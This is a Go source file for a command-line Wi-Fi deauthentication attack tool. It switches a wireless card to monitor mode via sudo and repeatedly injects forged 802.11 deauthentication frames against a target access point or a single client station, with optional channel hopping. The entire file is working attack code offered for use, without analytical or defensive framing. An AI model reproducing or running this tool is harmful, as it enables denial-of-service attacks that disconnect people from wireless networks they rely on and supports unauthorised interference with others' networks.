package main

import (
	"bytes"
	"encoding/binary"
	"flag"
	"fmt"
	"log"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"time"

	"github.com/google/gopacket/pcap"
)

func main() {
	User_interface := flag.String("i", "", "interface name")
	Ap_mac := flag.String("a", "", "AP MAC Address == BSSID")
	Station_mac := flag.String("s", "", "Station MAC Address")
	Auth_flag := flag.Bool("c", false, "Authentication Attack")
	flag.Parse()
	if *User_interface == "" {
		Usage()
	} else if *Ap_mac == "" {
		Usage()
	}
	Deauth_Attack(*User_interface, *Ap_mac, *Station_mac, *Auth_flag)
}

const (
	defaultSnapLen = 262144
)

type StringArray []string

func (arr *StringArray) String() string {
	return fmt.Sprintf("%v", *arr)
}

func (arr *StringArray) Set(s string) error {
	*arr = strings.Split(s, ",")
	return nil
}

func Usage() {
	fmt.Println(" - AP broadcast frame")
	fmt.Println(" 	- ./Deauth-Attack -i <interface> -a <ap mac>")
	fmt.Println(" - AP unicast, Station unicast frame")
	fmt.Println(" 	- ./Deauth-Attack -i <interface> -a <ap mac> -s <station mac>")
	fmt.Println(" - authentication frame")
	fmt.Println(" 	- ./Deauth-Attack -i <interface> -a <ap mac> -s <station mac> -c")
	os.Exit(-1)
}

func ExcuteCMD(script string, arg ...string) {
	cmd := exec.Command(script, arg...)
	output, err := cmd.CombinedOutput()
	if err != nil {
		fmt.Println(string(output))
		fmt.Println((err))
		os.Exit(-1)
	} else {
		fmt.Println(string(output))
	}
}

func Turnonmon(name string) {
	ExcuteCMD("sudo", "ifconfig", name, "down")
	fmt.Println("[*] " + name + " is down")
	ExcuteCMD("sudo", "iwconfig", name, "mode", "monitor")
	fmt.Println("[*] " + name + " turn monitor mode")
	ExcuteCMD("sudo", "ifconfig", name, "up")
	fmt.Println("[*] " + name + " is up \n")
}

func _Init_(User_interface string) int {
	Turnonmon(User_interface)
	tmp_CH := ""
	fmt.Printf("input Your AP Channel (defualt == 0): ")
	fmt.Scanln(&tmp_CH)
	if tmp_CH != "0" {
		ExcuteCMD("sudo", "iwconfig", User_interface, "channel", tmp_CH)
	}
	CH, err := strconv.Atoi(tmp_CH)
	if err != nil {
		fmt.Println(err)
	}

	return CH
}

func AP_broadcast(User_interface string, Ap_mac string) {

	handle, err := pcap.OpenLive(User_interface, defaultSnapLen, true, pcap.BlockForever)
	if err != nil {
		log.Fatal(err)
		os.Exit(-1)
	}
	defer handle.Close()

	CH := _Init_(User_interface)
	fmt.Println("AP_broadcast | Channel : ", CH)
	buffer := new(bytes.Buffer)
	Deauth_Header := [21]byte{0x00, 0x00, 0x0b, 0x00, 0x00, 0x80, 0x02, 0x00, 0x00, 0x00, 0x00, 0xc0, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff}
	binary.Write(buffer, binary.LittleEndian, Deauth_Header)
	addr := strings.SplitN(Ap_mac, ":", 6)
	var tmp_mac []uint8
	for _, str := range addr {
		tmp_uint64, err := strconv.ParseUint(str, 16, 64)
		if err != nil {
			fmt.Println(err)
		}
		tmp_uint8 := uint8(tmp_uint64)
		tmp_mac = append(tmp_mac, tmp_uint8)
	}

	Deauth_AP_MAC := [12]byte{tmp_mac[0], tmp_mac[1], tmp_mac[2], tmp_mac[3], tmp_mac[4], tmp_mac[5], tmp_mac[0], tmp_mac[1], tmp_mac[2], tmp_mac[3], tmp_mac[4], tmp_mac[5]}
	binary.Write(buffer, binary.LittleEndian, Deauth_AP_MAC)
	Deauth_Footer := [4]byte{0x50, 0x4f, 0x07, 0x00}
	binary.Write(buffer, binary.LittleEndian, Deauth_Footer)
	Deauth_packet := buffer.Bytes()
	for {
		if CH == 0 {
			for ch_hop := 1; ch_hop < 15; ch_hop++ {
				tmp_ch := strconv.Itoa(ch_hop)
				ExcuteCMD("sudo", "iwconfig", User_interface, "channel", tmp_ch)
				fmt.Println("Channel Hopping : ", tmp_ch)
				for i := 0; i < 20; i++ {
					handle.WritePacketData(Deauth_packet)
					fmt.Println("[*] Deauth Attack (AP Broadcast) AP : ", Ap_mac, " interface : ", User_interface, " Channel : ", tmp_ch)
					time.Sleep(time.Millisecond * 50)
				}
			}
		} else {
			handle.WritePacketData(Deauth_packet)
			fmt.Println("[*] Deauth Attack (AP Broadcast) AP : ", Ap_mac, " interface : ", User_interface, " Channel : ", CH)
			time.Sleep(time.Millisecond * 50)
		}
	}
}

func AP_unicast(User_interface string, Ap_mac string, Station_mac string) {
	handle, err := pcap.OpenLive(User_interface, defaultSnapLen, true, pcap.BlockForever)
	if err != nil {
		log.Fatal(err)
		os.Exit(-1)
	}
	defer handle.Close()

	CH := _Init_(User_interface)
	fmt.Println("AP_unicast | Channel : ", CH)
	buffer := new(bytes.Buffer)
	addr_station := strings.SplitN(Station_mac, ":", 6)
	var tmp_mac1 []uint8
	for _, str := range addr_station {
		tmp_uint64, err := strconv.ParseUint(str, 16, 64)
		if err != nil {
			fmt.Println(err)
		}
		tmp_uint8 := uint8(tmp_uint64)
		tmp_mac1 = append(tmp_mac1, tmp_uint8)
	}
	Deauth_Header := [21]byte{0x00, 0x00, 0x0b, 0x00, 0x00, 0x80, 0x02, 0x00, 0x00, 0x00, 0x00, 0xc0, 0x00, 0x00, 0x00, tmp_mac1[0], tmp_mac1[1], tmp_mac1[2], tmp_mac1[3], tmp_mac1[4], tmp_mac1[5]}
	binary.Write(buffer, binary.LittleEndian, Deauth_Header)

	addr_ap := strings.SplitN(Ap_mac, ":", 6)
	var tmp_mac2 []uint8
	for _, str := range addr_ap {
		tmp_uint64, err := strconv.ParseUint(str, 16, 64)
		if err != nil {
			fmt.Println(err)
		}
		tmp_uint8 := uint8(tmp_uint64)
		tmp_mac2 = append(tmp_mac2, tmp_uint8)
	}

	Deauth_AP_MAC := [12]byte{tmp_mac2[0], tmp_mac2[1], tmp_mac2[2], tmp_mac2[3], tmp_mac2[4], tmp_mac2[5], tmp_mac2[0], tmp_mac2[1], tmp_mac2[2], tmp_mac2[3], tmp_mac2[4], tmp_mac2[5]}
	binary.Write(buffer, binary.LittleEndian, Deauth_AP_MAC)
	Deauth_Footer := [4]byte{0x50, 0x4f, 0x07, 0x00}
	binary.Write(buffer, binary.LittleEndian, Deauth_Footer)
	Deauth_packet := buffer.Bytes()
	for {
		if CH == 0 {
			for ch_hop := 1; ch_hop < 15; ch_hop++ {
				tmp_ch := strconv.Itoa(ch_hop)
				ExcuteCMD("sudo", "iwconfig", User_interface, "channel", tmp_ch)
				fmt.Println("Channel Hopping : ", tmp_ch)
				for i := 0; i < 20; i++ {
					handle.WritePacketData(Deauth_packet)
					fmt.Println("[*] Deauth Attack (AP unicast) AP : ", Ap_mac, " Station : ", Station_mac, " interface : ", User_interface, " Channel : ", tmp_ch)
					time.Sleep(time.Millisecond * 50)
				}
			}
		} else {
			handle.WritePacketData(Deauth_packet)
			fmt.Println("[*] Deauth Attack (AP unicast) AP : ", Ap_mac, " Station : ", Station_mac, " interface : ", User_interface, " Channel : ", CH)
			time.Sleep(time.Millisecond * 50)
		}
	}
}

func AP_unicast_authentication(User_interface string, Ap_mac string, Station_mac string) {
	handle, err := pcap.OpenLive(User_interface, defaultSnapLen, true, pcap.BlockForever)
	if err != nil {
		log.Fatal(err)
		os.Exit(-1)
	}
	defer handle.Close()

	CH := _Init_(User_interface)
	fmt.Println("AP_unicast_authentication | Channel : ", CH)
	buffer := new(bytes.Buffer)
	addr_ap := strings.SplitN(Ap_mac, ":", 6)
	var tmp_mac1 []uint8
	for _, str := range addr_ap {
		tmp_uint64, err := strconv.ParseUint(str, 16, 64)
		if err != nil {
			fmt.Println(err)
		}
		tmp_uint8 := uint8(tmp_uint64)
		tmp_mac1 = append(tmp_mac1, tmp_uint8)
	}
	Deauth_Header := [21]byte{0x00, 0x00, 0x0b, 0x00, 0x00, 0x80, 0x02, 0x00, 0x00, 0x00, 0x00, 0xc0, 0x00, 0x00, 0x00, tmp_mac1[0], tmp_mac1[1], tmp_mac1[2], tmp_mac1[3], tmp_mac1[4], tmp_mac1[5]}
	binary.Write(buffer, binary.LittleEndian, Deauth_Header)

	addr_station := strings.SplitN(Station_mac, ":", 6)
	var tmp_mac2 []uint8
	for _, str := range addr_station {
		tmp_uint64, err := strconv.ParseUint(str, 16, 64)
		if err != nil {
			fmt.Println(err)
		}
		tmp_uint8 := uint8(tmp_uint64)
		tmp_mac2 = append(tmp_mac2, tmp_uint8)
	}

	Deauth_AP_MAC := [12]byte{tmp_mac2[0], tmp_mac2[1], tmp_mac2[2], tmp_mac2[3], tmp_mac2[4], tmp_mac2[5], tmp_mac1[0], tmp_mac1[1], tmp_mac1[2], tmp_mac1[3], tmp_mac1[4], tmp_mac1[5]}
	binary.Write(buffer, binary.LittleEndian, Deauth_AP_MAC)
	Deauth_Footer := [4]byte{0x50, 0x4f, 0x07, 0x00}
	binary.Write(buffer, binary.LittleEndian, Deauth_Footer)
	Deauth_packet := buffer.Bytes()
	for {
		if CH == 0 {
			for ch_hop := 1; ch_hop < 15; ch_hop++ {
				tmp_ch := strconv.Itoa(ch_hop)
				ExcuteCMD("sudo", "iwconfig", User_interface, "channel", tmp_ch)
				fmt.Println("Channel Hopping : ", tmp_ch)
				for i := 0; i < 20; i++ {
					handle.WritePacketData(Deauth_packet)
					fmt.Println("[*] Deauth Attack (AP unicast_Authentication) AP : ", Ap_mac, " Station : ", Station_mac, " interface : ", User_interface, " Channel : ", tmp_ch)
					time.Sleep(time.Millisecond * 50)
				}
			}
		} else {
			handle.WritePacketData(Deauth_packet)
			fmt.Println("[*] Deauth Attack (AP unicast_Authentication) AP : ", Ap_mac, " Station : ", Station_mac, " interface : ", User_interface, " Channel : ", CH)
			time.Sleep(time.Millisecond * 50)
		}
	}
}

func Deauth_Attack(User_interface string, Ap_mac string, Station_mac string, Auth_flag bool) {
	if Station_mac == "" {
		if Auth_flag {
			Usage()
		}
		AP_broadcast(User_interface, Ap_mac)
	} else if !Auth_flag {
		AP_unicast(User_interface, Ap_mac, Station_mac)
	} else {
		AP_unicast_authentication(User_interface, Ap_mac, Station_mac)
	}
}
